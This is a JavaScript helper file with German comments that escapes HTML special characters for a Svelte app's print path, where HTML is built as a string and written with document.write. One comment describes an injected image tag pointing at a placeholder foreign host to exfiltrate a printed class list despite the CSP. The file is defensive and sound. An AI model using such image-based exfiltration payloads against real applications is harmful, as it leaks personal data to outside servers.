// utils/escapeHtml.js
// Maskiert Text, der in zusammengebautes HTML eingesetzt wird.
//
// Svelte maskiert jede {…}-Interpolation im Template selbst — deshalb braucht die
// Anwendung das hier fast nirgends. Die eine Ausnahme ist der Druckpfad: Dort wird
// HTML als String gebaut und per document.write in ein neues Fenster geschrieben,
// und an dieser Naht endet Svelters Schutz.
//
// Was dort ohne Maskierung passiert, ist gemessen (06.08.2026): Ein <script> im
// Nachnamen wird von der geerbten CSP (script-src 'self') zwar blockiert — about:blank
// erbt die Richtlinie des Openers —, ein eingeschleustes
// <img src="https://fremder-host/?daten=…"> lädt aber, weil img-src ausdrücklich
// https: erlaubt. Aus einem manipulierten Stammdatensatz wird so ein Abfluss der
// gedruckten Klassenliste an einen fremden Server, ganz ohne Skriptausführung.
//
// Auch die Anführungszeichen werden maskiert: Der Helfer soll ohne Nachdenken
// zwischen Textinhalt und Attributwert austauschbar sein.

/**
 * @param {unknown} wert Beliebiger Wert; null/undefined ergeben ''.
 * @returns {string} Für HTML-Text und Attributwerte sichere Zeichenkette.
 */
export function escapeHtml(wert) {
	if (wert === null || wert === undefined) return '';
	return String(wert)
		.replaceAll('&', '&amp;')
		.replaceAll('<', '&lt;')
		.replaceAll('>', '&gt;')
		.replaceAll('"', '&quot;')
		.replaceAll("'", '&#39;');
}
